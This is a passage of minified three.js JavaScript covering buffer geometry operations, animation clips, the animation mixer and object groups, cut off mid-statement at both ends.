THREE.Matrix3).getNormalMatrix(a).applyToVector3Array(b.array),b.needsUpdate=!0);null!==this.boundingBox&&this.computeBoundingBox();null!==this.boundingSphere&&this.computeBoundingSphere();return this},rotateX:function(){var a;return function(b){void 0===a&&(a=new THREE.Matrix4);a.makeRotationX(b);this.applyMatrix(a);return this}}(),rotateY:function(){var a;return function(b){void 0===a&&(a=new THREE.Matrix4);a.makeRotationY(b);this.applyMatrix(a);return this}}(),rotateZ:function(){var a;\nreturn function(b){void 0===a&&(a=new THREE.Matrix4);a.makeRotationZ(b);this.applyMatrix(a);return this}}(),translate:function(){var a;return function(b,c,d){void 0===a&&(a=new THREE.Matrix4);a.makeTranslation(b,c,d);this.applyMatrix(a);return this}}(),scale:function(){var a;return function(b,c,d){void 0===a&&(a=new THREE.Matrix4);a.makeScale(b,c,d);this.applyMatrix(a);return this}}(),lookAt:function(){var a;return function(b){void 0===a&&(a=new THREE.Object3D);a.lookAt(b);a.updateMatrix();this.applyMatrix(a.matrix)}}(),\ncenter:function(){this.computeBoundingBox();var a=this.boundingBox.center().negate();this.translate(a.x,a.y,a.z);return a},setFromObject:function(a){var b=a.geometry;if(a instanceof THREE.Points||a instanceof THREE.Line){a=new THREE.Float32Attribute(3*b.vertices.length,3);var c=new THREE.Float32Attribute(3*b.colors.length,3);this.addAttribute(\"position\",a.copyVector3sArray(b.vertices));this.addAttribute(\"color\",c.copyColorsArray(b.colors));b.lineDistances&&b.lineDistances.length===b.vertices.length&&\n(a=new THREE.Float32Attribute(b.lineDistances.length,1),this.addAttribute(\"lineDistance\",a.copyArray(b.lineDistances)));null!==b.boundingSphere&&(this.boundingSphere=b.boundingSphere.clone());null!==b.boundingBox&&(this.boundingBox=b.boundingBox.clone())}else a instanceof THREE.Mesh&&b instanceof THREE.Geometry&&this.fromGeometry(b);return this},updateFromObject:function(a){var b=a.geometry;if(a instanceof THREE.Mesh){var c=b.__directGeometry;if(void 0===c)return this.fromGeometry(b);c.verticesNeedUpdate=\nb.verticesNeedUpdate;c.normalsNeedUpdate=b.normalsNeedUpdate;c.colorsNeedUpdate=b.colorsNeedUpdate;c.uvsNeedUpdate=b.uvsNeedUpdate;c.groupsNeedUpdate=b.groupsNeedUpdate;b.verticesNeedUpdate=!1;b.normalsNeedUpdate=!1;b.colorsNeedUpdate=!1;b.uvsNeedUpdate=!1;b.groupsNeedUpdate=!1;b=c}!0===b.verticesNeedUpdate&&(c=this.attributes.position,void 0!==c&&(c.copyVector3sArray(b.vertices),c.needsUpdate=!0),b.verticesNeedUpdate=!1);!0===b.normalsNeedUpdate&&(c=this.attributes.normal,void 0!==c&&(c.copyVector3sArray(b.normals),\nc.needsUpdate=!0),b.normalsNeedUpdate=!1);!0===b.colorsNeedUpdate&&(c=this.attributes.color,void 0!==c&&(c.copyColorsArray(b.colors),c.needsUpdate=!0),b.colorsNeedUpdate=!1);b.uvsNeedUpdate&&(c=this.attributes.uv,void 0!==c&&(c.copyVector2sArray(b.uvs),c.needsUpdate=!0),b.uvsNeedUpdate=!1);b.lineDistancesNeedUpdate&&(c=this.attributes.lineDistance,void 0!==c&&(c.copyArray(b.lineDistances),c.needsUpdate=!0),b.lineDistancesNeedUpdate=!1);b.groupsNeedUpdate&&(b.computeGroups(a.geometry),this.groups=\nb.groups,b.groupsNeedUpdate=!1);return this},fromGeometry:function(a){a.__directGeometry=(new THREE.DirectGeometry).fromGeometry(a);return this.fromDirectGeometry(a.__directGeometry)},fromDirectGeometry:function(a){var b=new Float32Array(3*a.vertices.length);this.addAttribute(\"position\",(new THREE.BufferAttribute(b,3)).copyVector3sArray(a.vertices));0<a.normals.length&&(b=new Float32Array(3*a.normals.length),this.addAttribute(\"normal\",(new THREE.BufferAttribute(b,3)).copyVector3sArray(a.normals)));\n0<a.colors.length&&(b=new Float32Array(3*a.colors.length),this.addAttribute(\"color\",(new THREE.BufferAttribute(b,3)).copyColorsArray(a.colors)));0<a.uvs.length&&(b=new Float32Array(2*a.uvs.length),this.addAttribute(\"uv\",(new THREE.BufferAttribute(b,2)).copyVector2sArray(a.uvs)));0<a.uvs2.length&&(b=new Float32Array(2*a.uvs2.length),this.addAttribute(\"uv2\",(new THREE.BufferAttribute(b,2)).copyVector2sArray(a.uvs2)));0<a.indices.length&&(b=new (65535<a.vertices.length?Uint32Array:Uint16Array)(3*a.indices.length),\nthis.setIndex((new THREE.BufferAttribute(b,1)).copyIndicesArray(a.indices)));this.groups=a.groups;for(var c in a.morphTargets){for(var b=[],d=a.morphTargets[c],e=0,f=d.length;e<f;e++){var g=d[e],h=new THREE.Float32Attribute(3*g.length,3);b.push(h.copyVector3sArray(g))}this.morphAttributes[c]=b}0<a.skinIndices.length&&(c=new THREE.Float32Attribute(4*a.skinIndices.length,4),this.addAttribute(\"skinIndex\",c.copyVector4sArray(a.skinIndices)));0<a.skinWeights.length&&(c=new THREE.Float32Attribute(4*a.skinWeights.length,\n4),this.addAttribute(\"skinWeight\",c.copyVector4sArray(a.skinWeights)));null!==a.boundingSphere&&(this.boundingSphere=a.boundingSphere.clone());null!==a.boundingBox&&(this.boundingBox=a.boundingBox.clone());return this},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new THREE.Box3);var a=this.attributes.position.array;void 0!==a?this.boundingBox.setFromArray(a):this.boundingBox.makeEmpty();(isNaN(this.boundingBox.min.x)||isNaN(this.boundingBox.min.y)||isNaN(this.boundingBox.min.z))&&\nconsole.error('THREE.BufferGeometry.computeBoundingBox: Computed min/max have NaN values. The \"position\" attribute is likely to have NaN values.',this)},computeBoundingSphere:function(){var a=new THREE.Box3,b=new THREE.Vector3;return function(){null===this.boundingSphere&&(this.boundingSphere=new THREE.Sphere);var c=this.attributes.position;if(c){var c=c.array,d=this.boundingSphere.center;a.setFromArray(c);a.center(d);for(var e=0,f=0,g=c.length;f<g;f+=3)b.fromArray(c,f),e=Math.max(e,d.distanceToSquared(b));\nthis.boundingSphere.radius=Math.sqrt(e);isNaN(this.boundingSphere.radius)&&console.error('THREE.BufferGeometry.computeBoundingSphere(): Computed radius is NaN. The \"position\" attribute is likely to have NaN values.',this)}}}(),computeFaceNormals:function(){},computeVertexNormals:function(){var a=this.index,b=this.attributes,c=this.groups;if(b.position){var d=b.position.array;if(void 0===b.normal)this.addAttribute(\"normal\",new THREE.BufferAttribute(new Float32Array(d.length),3));else for(var e=b.normal.array,\nf=0,g=e.length;f<g;f++)e[f]=0;var e=b.normal.array,h,k,l,n=new THREE.Vector3,p=new THREE.Vector3,m=new THREE.Vector3,q=new THREE.Vector3,r=new THREE.Vector3;if(a){a=a.array;0===c.length&&this.addGroup(0,a.length);for(var s=0,t=c.length;s<t;++s)for(f=c[s],g=f.start,h=f.count,f=g,g+=h;f<g;f+=3)h=3*a[f+0],k=3*a[f+1],l=3*a[f+2],n.fromArray(d,h),p.fromArray(d,k),m.fromArray(d,l),q.subVectors(m,p),r.subVectors(n,p),q.cross(r),e[h]+=q.x,e[h+1]+=q.y,e[h+2]+=q.z,e[k]+=q.x,e[k+1]+=q.y,e[k+2]+=q.z,e[l]+=q.x,\ne[l+1]+=q.y,e[l+2]+=q.z}else for(f=0,g=d.length;f<g;f+=9)n.fromArray(d,f),p.fromArray(d,f+3),m.fromArray(d,f+6),q.subVectors(m,p),r.subVectors(n,p),q.cross(r),e[f]=q.x,e[f+1]=q.y,e[f+2]=q.z,e[f+3]=q.x,e[f+4]=q.y,e[f+5]=q.z,e[f+6]=q.x,e[f+7]=q.y,e[f+8]=q.z;this.normalizeNormals();b.normal.needsUpdate=!0}},merge:function(a,b){if(!1===a instanceof THREE.BufferGeometry)console.error(\"THREE.BufferGeometry.merge(): geometry not an instance of THREE.BufferGeometry.\",a);else{void 0===b&&(b=0);var c=this.attributes,\nd;for(d in c)if(void 0!==a.attributes[d])for(var e=c[d].array,f=a.attributes[d],g=f.array,h=0,f=f.itemSize*b;h<g.length;h++,f++)e[f]=g[h];return this}},normalizeNormals:function(){for(var a=this.attributes.normal.array,b,c,d,e=0,f=a.length;e<f;e+=3)b=a[e],c=a[e+1],d=a[e+2],b=1/Math.sqrt(b*b+c*c+d*d),a[e]*=b,a[e+1]*=b,a[e+2]*=b},toNonIndexed:function(){if(null===this.index)return console.warn(\"THREE.BufferGeometry.toNonIndexed(): Geometry is already non-indexed.\"),this;var a=new THREE.BufferGeometry,\nb=this.index.array,c=this.attributes,d;for(d in c){for(var e=c[d],f=e.array,e=e.itemSize,g=new f.constructor(b.length*e),h=0,k=0,l=0,n=b.length;l<n;l++)for(var h=b[l]*e,p=0;p<e;p++)g[k++]=f[h++];a.addAttribute(d,new THREE.BufferAttribute(g,e))}return a},toJSON:function(){var a={metadata:{version:4.4,type:\"BufferGeometry\",generator:\"BufferGeometry.toJSON\"}};a.uuid=this.uuid;a.type=this.type;\"\"!==this.name&&(a.name=this.name);if(void 0!==this.parameters){var b=this.parameters,c;for(c in b)void 0!==\nb[c]&&(a[c]=b[c]);return a}a.data={attributes:{}};var d=this.index;null!==d&&(b=Array.prototype.slice.call(d.array),a.data.index={type:d.array.constructor.name,array:b});d=this.attributes;for(c in d){var e=d[c],b=Array.prototype.slice.call(e.array);a.data.attributes[c]={itemSize:e.itemSize,type:e.array.constructor.name,array:b,normalized:e.normalized}}c=this.groups;0<c.length&&(a.data.groups=JSON.parse(JSON.stringify(c)));c=this.boundingSphere;null!==c&&(a.data.boundingSphere={center:c.center.toArray(),\nradius:c.radius});return a},clone:function(){return(new THREE.BufferGeometry).copy(this)},copy:function(a){var b=a.index;null!==b&&this.setIndex(b.clone());var b=a.attributes,c;for(c in b)this.addAttribute(c,b[c].clone());a=a.groups;c=0;for(b=a.length;c<b;c++){var d=a[c];this.addGroup(d.start,d.count,d.materialIndex)}return this},dispose:function(){this.dispatchEvent({type:\"dispose\"})}});THREE.BufferGeometry.MaxIndex=65535;\nTHREE.InstancedBufferGeometry=function(){THREE.BufferGeometry.call(this);this.type=\"InstancedBufferGeometry\";this.maxInstancedCount=void 0};THREE.InstancedBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.InstancedBufferGeometry.prototype.constructor=THREE.InstancedBufferGeometry;THREE.InstancedBufferGeometry.prototype.addGroup=function(a,b,c){this.groups.push({start:a,count:b,instances:c})};\nTHREE.InstancedBufferGeometry.prototype.copy=function(a){var b=a.index;null!==b&&this.setIndex(b.clone());var b=a.attributes,c;for(c in b)this.addAttribute(c,b[c].clone());a=a.groups;c=0;for(b=a.length;c<b;c++){var d=a[c];this.addGroup(d.start,d.count,d.instances)}return this};THREE.Uniform=function(a,b){\"string\"===typeof a&&(console.warn(\"THREE.Uniform: Type parameter is no longer needed.\"),a=b);this.value=a;this.dynamic=!1};\nTHREE.Uniform.prototype={constructor:THREE.Uniform,onUpdate:function(a){this.dynamic=!0;this.onUpdateCallback=a;return this}};THREE.AnimationAction=function(){throw Error(\"THREE.AnimationAction: Use mixer.clipAction for construction.\");};\nTHREE.AnimationAction._new=function(a,b,c){this._mixer=a;this._clip=b;this._localRoot=c||null;a=b.tracks;b=a.length;c=Array(b);for(var d={endingStart:THREE.ZeroCurvatureEnding,endingEnd:THREE.ZeroCurvatureEnding},e=0;e!==b;++e){var f=a[e].createInterpolant(null);c[e]=f;f.settings=d}this._interpolantSettings=d;this._interpolants=c;this._propertyBindings=Array(b);this._weightInterpolant=this._timeScaleInterpolant=this._byClipCacheIndex=this._cacheIndex=null;this.loop=THREE.LoopRepeat;this._loopCount=\n-1;this._startTime=null;this.time=0;this._effectiveWeight=this.weight=this._effectiveTimeScale=this.timeScale=1;this.repetitions=Infinity;this.paused=!1;this.enabled=!0;this.clampWhenFinished=!1;this.zeroSlopeAtEnd=this.zeroSlopeAtStart=!0};\nTHREE.AnimationAction._new.prototype={constructor:THREE.AnimationAction._new,play:function(){this._mixer._activateAction(this);return this},stop:function(){this._mixer._deactivateAction(this);return this.reset()},reset:function(){this.paused=!1;this.enabled=!0;this.time=0;this._loopCount=-1;this._startTime=null;return this.stopFading().stopWarping()},isRunning:function(){return this.enabled&&!this.paused&&0!==this.timeScale&&null===this._startTime&&this._mixer._isActiveAction(this)},isScheduled:function(){return this._mixer._isActiveAction(this)},\nstartAt:function(a){this._startTime=a;return this},setLoop:function(a,b){this.loop=a;this.repetitions=b;return this},setEffectiveWeight:function(a){this.weight=a;this._effectiveWeight=this.enabled?a:0;return this.stopFading()},getEffectiveWeight:function(){return this._effectiveWeight},fadeIn:function(a){return this._scheduleFading(a,0,1)},fadeOut:function(a){return this._scheduleFading(a,1,0)},crossFadeFrom:function(a,b,c){a.fadeOut(b);this.fadeIn(b);if(c){c=this._clip.duration;var d=a._clip.duration,\ne=c/d;a.warp(1,d/c,b);this.warp(e,1,b)}return this},crossFadeTo:function(a,b,c){return a.crossFadeFrom(this,b,c)},stopFading:function(){var a=this._weightInterpolant;null!==a&&(this._weightInterpolant=null,this._mixer._takeBackControlInterpolant(a));return this},setEffectiveTimeScale:function(a){this.timeScale=a;this._effectiveTimeScale=this.paused?0:a;return this.stopWarping()},getEffectiveTimeScale:function(){return this._effectiveTimeScale},setDuration:function(a){this.timeScale=this._clip.duration/\na;return this.stopWarping()},syncWith:function(a){this.time=a.time;this.timeScale=a.timeScale;return this.stopWarping()},halt:function(a){return this.warp(this._effectiveTimeScale,0,a)},warp:function(a,b,c){var d=this._mixer,e=d.time,f=this._timeScaleInterpolant,g=this.timeScale;null===f&&(this._timeScaleInterpolant=f=d._lendControlInterpolant());d=f.parameterPositions;f=f.sampleValues;d[0]=e;d[1]=e+c;f[0]=a/g;f[1]=b/g;return this},stopWarping:function(){var a=this._timeScaleInterpolant;null!==a&&\n(this._timeScaleInterpolant=null,this._mixer._takeBackControlInterpolant(a));return this},getMixer:function(){return this._mixer},getClip:function(){return this._clip},getRoot:function(){return this._localRoot||this._mixer._root},_update:function(a,b,c,d){var e=this._startTime;if(null!==e){b=(a-e)*c;if(0>b||0===c)return;this._startTime=null;b*=c}b*=this._updateTimeScale(a);c=this._updateTime(b);a=this._updateWeight(a);if(0<a){b=this._interpolants;for(var e=this._propertyBindings,f=0,g=b.length;f!==\ng;++f)b[f].evaluate(c),e[f].accumulate(d,a)}},_updateWeight:function(a){var b=0;if(this.enabled){var b=this.weight,c=this._weightInterpolant;if(null!==c){var d=c.evaluate(a)[0],b=b*d;a>c.parameterPositions[1]&&(this.stopFading(),0===d&&(this.enabled=!1))}}return this._effectiveWeight=b},_updateTimeScale:function(a){var b=0;if(!this.paused){var b=this.timeScale,c=this._timeScaleInterpolant;if(null!==c){var d=c.evaluate(a)[0],b=b*d;a>c.parameterPositions[1]&&(this.stopWarping(),0===b?this.paused=!0:\nthis.timeScale=b)}}return this._effectiveTimeScale=b},_updateTime:function(a){var b=this.time+a;if(0===a)return b;var c=this._clip.duration,d=this.loop,e=this._loopCount;if(d===THREE.LoopOnce)a:{if(-1===e&&(this.loopCount=0,this._setEndings(!0,!0,!1)),b>=c)b=c;else if(0>b)b=0;else break a;this.clampWhenFinished?this.paused=!0:this.enabled=!1;this._mixer.dispatchEvent({type:\"finished\",action:this,direction:0>a?-1:1})}else{d=d===THREE.LoopPingPong;-1===e&&(0<=a?(e=0,this._setEndings(!0,0===this.repetitions,\nd)):this._setEndings(0===this.repetitions,!0,d));if(b>=c||0>b){var f=Math.floor(b/c),b=b-c*f,e=e+Math.abs(f),g=this.repetitions-e;0>g?(this.clampWhenFinished?this.paused=!0:this.enabled=!1,b=0<a?c:0,this._mixer.dispatchEvent({type:\"finished\",action:this,direction:0<a?1:-1})):(0===g?(a=0>a,this._setEndings(a,!a,d)):this._setEndings(!1,!1,d),this._loopCount=e,this._mixer.dispatchEvent({type:\"loop\",action:this,loopDelta:f}))}if(d&&1===(e&1))return this.time=b,c-b}return this.time=b},_setEndings:function(a,\nb,c){var d=this._interpolantSettings;c?(d.endingStart=THREE.ZeroSlopeEnding,d.endingEnd=THREE.ZeroSlopeEnding):(d.endingStart=a?this.zeroSlopeAtStart?THREE.ZeroSlopeEnding:THREE.ZeroCurvatureEnding:THREE.WrapAroundEnding,d.endingEnd=b?this.zeroSlopeAtEnd?THREE.ZeroSlopeEnding:THREE.ZeroCurvatureEnding:THREE.WrapAroundEnding)},_scheduleFading:function(a,b,c){var d=this._mixer,e=d.time,f=this._weightInterpolant;null===f&&(this._weightInterpolant=f=d._lendControlInterpolant());d=f.parameterPositions;\nf=f.sampleValues;d[0]=e;f[0]=b;d[1]=e+a;f[1]=c;return this}};THREE.AnimationClip=function(a,b,c){this.name=a;this.tracks=c;this.duration=void 0!==b?b:-1;this.uuid=THREE.Math.generateUUID();0>this.duration&&this.resetDuration();this.trim();this.optimize()};\nTHREE.AnimationClip.prototype={constructor:THREE.AnimationClip,resetDuration:function(){for(var a=0,b=0,c=this.tracks.length;b!==c;++b)var d=this.tracks[b],a=Math.max(a,d.times[d.times.length-1]);this.duration=a},trim:function(){for(var a=0;a<this.tracks.length;a++)this.tracks[a].trim(0,this.duration);return this},optimize:function(){for(var a=0;a<this.tracks.length;a++)this.tracks[a].optimize();return this}};\nObject.assign(THREE.AnimationClip,{parse:function(a){for(var b=[],c=a.tracks,d=1/(a.fps||1),e=0,f=c.length;e!==f;++e)b.push(THREE.KeyframeTrack.parse(c[e]).scale(d));return new THREE.AnimationClip(a.name,a.duration,b)},toJSON:function(a){var b=[],c=a.tracks;a={name:a.name,duration:a.duration,tracks:b};for(var d=0,e=c.length;d!==e;++d)b.push(THREE.KeyframeTrack.toJSON(c[d]));return a},CreateFromMorphTargetSequence:function(a,b,c,d){for(var e=b.length,f=[],g=0;g<e;g++){var h=[],k=[];h.push((g+e-1)%\ne,g,(g+1)%e);k.push(0,1,0);var l=THREE.AnimationUtils.getKeyframeOrder(h),h=THREE.AnimationUtils.sortedArray(h,1,l),k=THREE.AnimationUtils.sortedArray(k,1,l);d||0!==h[0]||(h.push(e),k.push(k[0]));f.push((new THREE.NumberKeyframeTrack(\".morphTargetInfluences[\"+b[g].name+\"]\",h,k)).scale(1/c))}return new THREE.AnimationClip(a,-1,f)},findByName:function(a,b){var c=a;Array.isArray(a)||(c=a.geometry&&a.geometry.animations||a.animations);for(var d=0;d<c.length;d++)if(c[d].name===b)return c[d];return null},\nCreateClipsFromMorphTargetSequences:function(a,b,c){for(var d={},e=/^([\\w-]*?)([\\d]+)$/,f=0,g=a.length;f<g;f++){var h=a[f],k=h.name.match(e);if(k&&1<k.length){var l=k[1];(k=d[l])||(d[l]=k=[]);k.push(h)}}a=[];for(l in d)a.push(THREE.AnimationClip.CreateFromMorphTargetSequence(l,d[l],b,c));return a},parseAnimation:function(a,b,c){if(!a)return console.error(\"  no animation in JSONLoader data\"),null;c=function(a,b,c,d,e){if(0!==c.length){var f=[],g=[];THREE.AnimationUtils.flattenJSON(c,f,g,d);0!==f.length&&\ne.push(new a(b,f,g))}};var d=[],e=a.name||\"default\",f=a.length||-1,g=a.fps||30;a=a.hierarchy||[];for(var h=0;h<a.length;h++){var k=a[h].keys;if(k&&0!==k.length)if(k[0].morphTargets){for(var f={},l=0;l<k.length;l++)if(k[l].morphTargets)for(var n=0;n<k[l].morphTargets.length;n++)f[k[l].morphTargets[n]]=-1;for(var p in f){for(var m=[],q=[],n=0;n!==k[l].morphTargets.length;++n){var r=k[l];m.push(r.time);q.push(r.morphTarget===p?1:0)}d.push(new THREE.NumberKeyframeTrack(\".morphTargetInfluence[\"+p+\"]\",\nm,q))}f=f.length*(g||1)}else l=\".bones[\"+b[h].name+\"]\",c(THREE.VectorKeyframeTrack,l+\".position\",k,\"pos\",d),c(THREE.QuaternionKeyframeTrack,l+\".quaternion\",k,\"rot\",d),c(THREE.VectorKeyframeTrack,l+\".scale\",k,\"scl\",d)}return 0===d.length?null:new THREE.AnimationClip(e,f,d)}});THREE.AnimationMixer=function(a){this._root=a;this._initMemoryManager();this.time=this._accuIndex=0;this.timeScale=1};\nObject.assign(THREE.AnimationMixer.prototype,THREE.EventDispatcher.prototype,{clipAction:function(a,b){var c=b||this._root,d=c.uuid,e=\"string\"===typeof a?THREE.AnimationClip.findByName(c,a):a,c=null!==e?e.uuid:a,f=this._actionsByClip[c],g=null;if(void 0!==f){g=f.actionByRoot[d];if(void 0!==g)return g;g=f.knownActions[0];null===e&&(e=g._clip)}if(null===e)return null;e=new THREE.AnimationMixer._Action(this,e,b);this._bindAction(e,g);this._addInactiveAction(e,c,d);return e},existingAction:function(a,\nb){var c=b||this._root,d=c.uuid,c=\"string\"===typeof a?THREE.AnimationClip.findByName(c,a):a,c=this._actionsByClip[c?c.uuid:a];return void 0!==c?c.actionByRoot[d]||null:null},stopAllAction:function(){for(var a=this._actions,b=this._nActiveActions,c=this._bindings,d=this._nActiveBindings,e=this._nActiveBindings=this._nActiveActions=0;e!==b;++e)a[e].reset();for(e=0;e!==d;++e)c[e].useCount=0;return this},update:function(a){a*=this.timeScale;for(var b=this._actions,c=this._nActiveActions,d=this.time+=\na,e=Math.sign(a),f=this._accuIndex^=1,g=0;g!==c;++g){var h=b[g];h.enabled&&h._update(d,a,e,f)}a=this._bindings;b=this._nActiveBindings;for(g=0;g!==b;++g)a[g].apply(f);return this},getRoot:function(){return this._root},uncacheClip:function(a){var b=this._actions;a=a.uuid;var c=this._actionsByClip,d=c[a];if(void 0!==d){for(var d=d.knownActions,e=0,f=d.length;e!==f;++e){var g=d[e];this._deactivateAction(g);var h=g._cacheIndex,k=b[b.length-1];g._cacheIndex=null;g._byClipCacheIndex=null;k._cacheIndex=\nh;b[h]=k;b.pop();this._removeInactiveBindingsForAction(g)}delete c[a]}},uncacheRoot:function(a){a=a.uuid;var b=this._actionsByClip,c;for(c in b){var d=b[c].actionByRoot[a];void 0!==d&&(this._deactivateAction(d),this._removeInactiveAction(d))}c=this._bindingsByRootAndName[a];if(void 0!==c)for(var e in c)a=c[e],a.restoreOriginalState(),this._removeInactiveBinding(a)},uncacheAction:function(a,b){var c=this.existingAction(a,b);null!==c&&(this._deactivateAction(c),this._removeInactiveAction(c))}});\nTHREE.AnimationMixer._Action=THREE.AnimationAction._new;\nObject.assign(THREE.AnimationMixer.prototype,{_bindAction:function(a,b){var c=a._localRoot||this._root,d=a._clip.tracks,e=d.length,f=a._propertyBindings,g=a._interpolants,h=c.uuid,k=this._bindingsByRootAndName,l=k[h];void 0===l&&(l={},k[h]=l);for(k=0;k!==e;++k){var n=d[k],p=n.name,m=l[p];if(void 0===m){m=f[k];if(void 0!==m){null===m._cacheIndex&&(++m.referenceCount,this._addInactiveBinding(m,h,p));continue}m=new THREE.PropertyMixer(THREE.PropertyBinding.create(c,p,b&&b._propertyBindings[k].binding.parsedPath),\nn.ValueTypeName,n.getValueSize());++m.referenceCount;this._addInactiveBinding(m,h,p)}f[k]=m;g[k].resultBuffer=m.buffer}},_activateAction:function(a){if(!this._isActiveAction(a)){if(null===a._cacheIndex){var b=(a._localRoot||this._root).uuid,c=a._clip.uuid,d=this._actionsByClip[c];this._bindAction(a,d&&d.knownActions[0]);this._addInactiveAction(a,c,b)}b=a._propertyBindings;c=0;for(d=b.length;c!==d;++c){var e=b[c];0===e.useCount++&&(this._lendBinding(e),e.saveOriginalState())}this._lendAction(a)}},\n_deactivateAction:function(a){if(this._isActiveAction(a)){for(var b=a._propertyBindings,c=0,d=b.length;c!==d;++c){var e=b[c];0===--e.useCount&&(e.restoreOriginalState(),this._takeBackBinding(e))}this._takeBackAction(a)}},_initMemoryManager:function(){this._actions=[];this._nActiveActions=0;this._actionsByClip={};this._bindings=[];this._nActiveBindings=0;this._bindingsByRootAndName={};this._controlInterpolants=[];this._nActiveControlInterpolants=0;var a=this;this.stats={actions:{get total(){return a._actions.length},\nget inUse(){return a._nActiveActions}},bindings:{get total(){return a._bindings.length},get inUse(){return a._nActiveBindings}},controlInterpolants:{get total(){return a._controlInterpolants.length},get inUse(){return a._nActiveControlInterpolants}}}},_isActiveAction:function(a){a=a._cacheIndex;return null!==a&&a<this._nActiveActions},_addInactiveAction:function(a,b,c){var d=this._actions,e=this._actionsByClip,f=e[b];void 0===f?(f={knownActions:[a],actionByRoot:{}},a._byClipCacheIndex=0,e[b]=f):(b=\nf.knownActions,a._byClipCacheIndex=b.length,b.push(a));a._cacheIndex=d.length;d.push(a);f.actionByRoot[c]=a},_removeInactiveAction:function(a){var b=this._actions,c=b[b.length-1],d=a._cacheIndex;c._cacheIndex=d;b[d]=c;b.pop();a._cacheIndex=null;var c=a._clip.uuid,d=this._actionsByClip,e=d[c],f=e.knownActions,g=f[f.length-1],h=a._byClipCacheIndex;g._byClipCacheIndex=h;f[h]=g;f.pop();a._byClipCacheIndex=null;delete e.actionByRoot[(b._localRoot||this._root).uuid];0===f.length&&delete d[c];this._removeInactiveBindingsForAction(a)},\n_removeInactiveBindingsForAction:function(a){a=a._propertyBindings;for(var b=0,c=a.length;b!==c;++b){var d=a[b];0===--d.referenceCount&&this._removeInactiveBinding(d)}},_lendAction:function(a){var b=this._actions,c=a._cacheIndex,d=this._nActiveActions++,e=b[d];a._cacheIndex=d;b[d]=a;e._cacheIndex=c;b[c]=e},_takeBackAction:function(a){var b=this._actions,c=a._cacheIndex,d=--this._nActiveActions,e=b[d];a._cacheIndex=d;b[d]=a;e._cacheIndex=c;b[c]=e},_addInactiveBinding:function(a,b,c){var d=this._bindingsByRootAndName,\ne=d[b],f=this._bindings;void 0===e&&(e={},d[b]=e);e[c]=a;a._cacheIndex=f.length;f.push(a)},_removeInactiveBinding:function(a){var b=this._bindings,c=a.binding,d=c.rootNode.uuid,c=c.path,e=this._bindingsByRootAndName,f=e[d],g=b[b.length-1];a=a._cacheIndex;g._cacheIndex=a;b[a]=g;b.pop();delete f[c];a:{for(var h in f)break a;delete e[d]}},_lendBinding:function(a){var b=this._bindings,c=a._cacheIndex,d=this._nActiveBindings++,e=b[d];a._cacheIndex=d;b[d]=a;e._cacheIndex=c;b[c]=e},_takeBackBinding:function(a){var b=\nthis._bindings,c=a._cacheIndex,d=--this._nActiveBindings,e=b[d];a._cacheIndex=d;b[d]=a;e._cacheIndex=c;b[c]=e},_lendControlInterpolant:function(){var a=this._controlInterpolants,b=this._nActiveControlInterpolants++,c=a[b];void 0===c&&(c=new THREE.LinearInterpolant(new Float32Array(2),new Float32Array(2),1,this._controlInterpolantsResultBuffer),c.__cacheIndex=b,a[b]=c);return c},_takeBackControlInterpolant:function(a){var b=this._controlInterpolants,c=a.__cacheIndex,d=--this._nActiveControlInterpolants,\ne=b[d];a.__cacheIndex=d;b[d]=a;e.__cacheIndex=c;b[c]=e},_controlInterpolantsResultBuffer:new Float32Array(1)});\nTHREE.AnimationObjectGroup=function(a){this.uuid=THREE.Math.generateUUID();this._objects=Array.prototype.slice.call(arguments);this.nCachedObjects_=0;var b={};this._indicesByUUID=b;for(var c=0,d=arguments.length;c!==d;++c)b[arguments[c].uuid]=c;this._paths=[];this._parsedPaths=[];this._bindings=[];this._bindingsIndicesByPath={};var e=this;this.stats={objects:{get total(){return e._objects.length},get inUse(){return this.total-e.nCachedObjects_}},get bindingsPerObject(){return e._bindings.length}}};\nTHREE.AnimationObjectGroup.prototype={constructor:THREE.AnimationObjectGroup,add:function(a){for(var b=this._objects,c=b.length,d=this.nCachedObjects_,e=this._indicesByUUID,f=this._paths,g=this._parsedPaths,h=this._bindings,k=h.length,l=0,n=arguments.length;l!==n;++l){var p=arguments[l],m=p.uuid,q=e[m];if(void 0===q){q=c++;e[m]=q;b.push(p);for(var m=0,r=k;m!==r;++m)h[m].push(new THREE.PropertyBinding(p,f[m],g[m]))}else if(q<d){var s=b[q],t=--d,r=b[t];e[r.uuid]=q;b[q]=r;e[m]=t;b[t]=p;m=0;for(r=k;m!==\nr;++m){var u=h[m],v=u[q];u[q]=u[t];void 0===v&&(v=new THREE.PropertyBinding(p,f[m],g[m]));u[t]=v}}else b[q]!==s&&console.error(\"Different objects with the same UUID detected. Clean the caches or recreate your infrastructure when reloading scenes...\")}this.nCachedObjects_=d},remove:function(a){for(var b=this._objects,c=this.nCachedObjects_,d=this._indicesByUUID,e=this._bindings,f=e.length,g=0,h=arguments.length;g!==h;++g){var k=arguments[g],l=k.uuid,n=d[l];if(void 0!==n&&n>=c){var p=c++,m=b[p];d[m.uuid]=\nn;b[n]=m;d[l]=p;b[p]=k;k=0;for(l=f;k!==l;++k){var m=e[k],q=m[n];m[n]=m[p];m[p]=q}}}this.nCachedObjects_=c},uncache:function(a){for(var b=this._objects,c=b.length,d=this.nCachedObjects_,e=this._indicesByUUID,f=this._bindings,g=f.length,h=0,k=arguments.length;h!==k;++h){var l=arguments[h].uuid,n=e[l];if(void 0!==n)if(delete e[l],n<d){var l=--d,p=b[l],m=--c,q=b[m];e[p.uuid]=n;b[n]=p;e[q.uuid]=l;b[l]=q;b.pop();p=0;for(q=g;p!==q;++p){var r=f[p],s=r[m];r[n]=r[l];r[l]=s;r.pop()}}else for(m=--c,q=b[m],e[q.uuid]=\nn,b[n]=q,b.pop(),p=0,q=g;p!==q;++p)r=f[p],r[n]=r[m],r.pop()}this.nCachedObjects_=d},subscribe_:function(a,b){var c=this._bindingsIndicesByPath,d=c[a],e=this._bindings;if(void 0!==d)return e[d];var f=this._paths,g=this._parsedPaths,h=this._objects,k=this.nCachedObjects_,l=Array(h.length),d=e.length;c[a]=d;f.push(a);g.push(b);e.push(l);c=k;for(d=h.length;c!==d;++c)l[c]=new THREE.PropertyBinding(h[c],a,b);return l},unsubscribe_:function(a){var b=this._bindingsIndicesByPath,c=b[a];if(void 0!==c){var 